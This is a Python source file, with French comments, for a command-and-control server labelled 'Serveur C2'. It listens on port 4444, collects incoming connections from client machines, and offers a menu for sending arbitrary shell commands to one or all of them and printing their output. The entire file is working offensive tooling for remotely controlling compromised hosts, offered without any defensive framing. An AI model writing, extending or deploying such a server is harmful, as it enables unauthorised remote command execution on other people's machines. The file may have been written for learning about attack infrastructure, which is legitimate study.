import socket
import threading
import sys
import time
from rich.table import Table
from rich.console import Console

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.connexions = []  # liste des connexions actives
        self.flag = True # flag pour les boucles while true
        self.commande = "" # initiation de la variable commande
        self.machine = 0 # initiation de la variable du numéro de la machine
        self.liste = [] # initiation d'une machine qui comprendra les machines utilisée pour les commandes
        self.pwd = "" # chemin pour une seule machine

    def gestion(self, connexion, adresse):
        print("\n\nConnecté avec", adresse)
        print("(appuyez sur Entrée pour réafficher le menu)")
        self.connexions.append(connexion) # ajoute la connexions à la liste des connexions

    def ecoute(self):
        threading.Thread(target=self.menu).start() # mise en place du menu constant
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(3)
        print('\nEn écoute...\n')
        while True:
            try:
                connexion, adresse = self.server_socket.accept()
                client = threading.Thread(target=self.gestion, args=(connexion, adresse))
                client.start()
            except:
                sys.exit()

    def menu(self):
        while self.flag:
            time.sleep(0.1) # pour laisser le temps à chaque boucle
            menu = Table(title="Menu du Serveur C2")
            menu.add_column("N° du choix", justify="center", style="red")
            menu.add_column("Description", justify="left", style="green")
            menu.add_row("1", "Envoyer une commande à tous les clients")
            menu.add_row("2", "Envoyer une commande à un seul client")
            menu.add_row("3", "Voir les clients connectés")
            menu.add_row("4", "Quitter")
            console = Console()
            console.print(menu)
            choix = input("\nEntrez votre choix : ")
            print("\n")
            if choix == "1":
                if not self.connexions:
                    print("Il n'y a aucune connexion active pour le moment.\n")
                else:
                    for i in range(len(self.connexions)):
                        self.liste.append(i) # on met chaque machine dans la liste à controler
                    self.echange(self.liste)
            elif choix == "2":
                if not self.connexions:
                    print("Il n'y a aucune machine active sur le serveur pour le moment.\n")
                else:
                    self.lister()
                    while self.flag:
                        try:
                            self.machine = int(input("\nEntrez le numéro de la machine à contrôler : "))
                            if 1 <= self.machine <= len(self.connexions):
                                self.flag = False # si l'input est correct, arrêt de la boucle pour demander
                            else:
                                print("\nEntrez un n° de machine valide")
                        except:
                            print("\nEntrez un nombre")
                    self.flag = True # pour pas arrêter le menu principal constant
                    self.echange([self.machine-1])
            elif choix == "3":
                self.lister()
                print("\nRetour au menu...\n")
            elif choix == "4":
                self.flag = False # arrêt de la boucle du menu
                for conn in self.connexions:
                    conn.send("exit".encode())
                    conn.close()
                self.server_socket.close()
                sys.exit()

    def lister(self):
        liste = Table(title="Connexions actives")
        liste.add_column("N° de la connexion", justify="center", style="cyan")
        liste.add_column("Adresse IP",justify="center", style="magenta")
        liste.add_column("Port", justify="right", style="green")
        for i in range(len(self.connexions)):
            ip, port = self.connexions[i].getpeername() # .getpeername() -> prend l'adresse et le port
            liste.add_row(str(i+1), str(ip), str(port))
        console = Console()
        console.print(liste)

    def echange(self,numeros):
        while self.commande != "stop" and self.commande != "exit":
            print("\nEntrez la commande à exécuter ('stop' pour revenir au menu principal, 'exit' pour se déconnecter des machines)")
            if len(numeros) == 1:
                self.connexions[numeros[0]].send("pwd".encode())
                self.pwd = self.connexions[numeros[0]].recv(1024).decode().strip() # strip pour enlever le saut de ligne après le pwd
            self.commande = input(f"{self.pwd} >>> ")
            if self.commande == "": # si on appuie sur entrée, relancer l'input
                continue
            else:
                for i in numeros:
                    self.connexions[i].send(self.commande.encode())
                    print("\nRésultat de la commande pour",self.connexions[i].getpeername()," :\n")
                    print(self.connexions[i].recv(1024).decode())
                    if self.commande == "exit":
                        self.connexions.pop(i) # vide la liste des machines connectées
                        for j in range(len(numeros)): # si on tape exit, à chaque fois qu'on enlève une machine de la liste on enlève 1 partout pour pas out of range
                            numeros[j]-=1
            self.pwd = "" # reset du pwd
        self.commande = "" # reset la variable après que la boucle soit terminée pour pouvoir rerentrer plus tard
        self.liste = []
        print(" "*25,"Retour au menu...")

if __name__ == "__main__":
    server = C2Server()
    server.ecoute()
